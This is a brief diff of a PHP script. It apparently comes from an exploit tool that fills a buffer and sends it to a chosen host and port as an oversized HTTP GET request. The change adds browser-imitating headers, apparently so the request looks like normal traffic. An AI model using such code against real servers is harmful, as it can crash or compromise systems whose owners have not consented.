@@ -11,8 +11,13 @@ for($x=0;$x<$buffer;$x++) {
 }
 
 $headers="GET /$packet HTTP/1.1\r\n";
-$headers.= "Host: $host\r\n";
-$headers.= "Connection: close\r\n\r\n";
+$headers.="Host: $host\r\n";
+$headers.="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0\r\n";
+$headers.="Content-Type: text/plain;charset=UTF-8\r\n";
+$headers.="Accept: text/html,application/xhtml+xml,application/xml\r\n";
+$headers.="Accept-Language: en-US\r\n";
+$headers.="Accept-Encoding: gzip, deflate\r\n";
+$headers.="Connection: close\r\n\r\n";
 $headers.=$packet;
 
 if(!empty($host) && !empty($port) && !empty($buffer)) {
